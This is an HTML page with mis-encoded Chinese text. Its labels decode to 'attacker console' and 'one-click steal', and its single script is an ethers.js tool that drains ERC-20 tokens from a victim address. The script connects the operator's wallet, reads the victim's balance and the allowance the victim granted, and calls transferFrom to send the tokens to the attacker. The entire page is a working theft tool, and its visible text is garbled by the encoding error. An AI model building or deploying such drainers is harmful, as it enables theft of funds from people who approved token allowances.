
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>æ§åˆ¶å° - è½‰ç§»æˆæ¬Šä»£å¹£</title>
</head>
<body style="text-align:center;padding-top:50px;">
  <h2>ğŸ’€ æ”»æ“Šè€…æ§åˆ¶å°</h2>
  <input type="text" id="victim" placeholder="è¼¸å…¥å—å®³è€…åœ°å€">
  <br><br>
  <button onclick="steal()">ä¸€éµç›œå–</button>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <script>
    const tokenAddress = "0x3F767995d0Bbe0587dDC801Dd7e8f40d15ed0958";
    const abi = [
      "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function allowance(address owner, address spender) external view returns (uint256)"
    ];

    async function steal() {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(tokenAddress, abi, signer);
      const victim = document.getElementById("victim").value;
      const attacker = await signer.getAddress();

      const balance = await contract.balanceOf(victim);
      const allowance = await contract.allowance(victim, attacker);
      const amount = balance.lt(allowance) ? balance : allowance;

      if (amount.gt(0)) {
        await contract.transferFrom(victim, attacker, amount);
        alert(`æˆåŠŸè½‰å‡º ${amount.toString()} TTK`);
      } else {
        alert("å—å®³è€…æ²’æœ‰è³‡ç”¢æˆ–æœªæˆæ¬Š");
      }
    }
  </script>
</body>
</html>
